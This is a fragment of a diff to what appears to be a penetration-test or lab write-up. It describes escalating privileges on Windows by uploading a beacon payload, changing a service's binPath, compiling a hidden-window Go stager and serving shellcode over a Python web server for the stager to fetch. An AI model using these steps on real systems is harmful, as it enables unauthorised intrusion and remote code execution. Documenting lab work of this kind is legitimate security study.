@@ -1171,7 +1171,7 @@ Mode                LastWriteTime         Length Name
 
 I can try and upload a beacon payload into this directory since i have (M) read/write/execute of this directory, then change the `binPath`
 
-So ill use the stager.go code from earlier, since the http.x64.bin payload holds the correct listener info
+So ill use the stager.go code from earlier, since the http.x64.bin payload holds the correct listener info that is also still running
 
 ```python
 GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-H windowsgui" -o stager.exe stager.go
@@ -1200,4 +1200,8 @@ Then after uploading ill change the `binPath`
 python3 -m http.server 80
 ```
 
+Ill start a webserver so the stager can reach back in pull the shellcode
 
+```python
+
+```
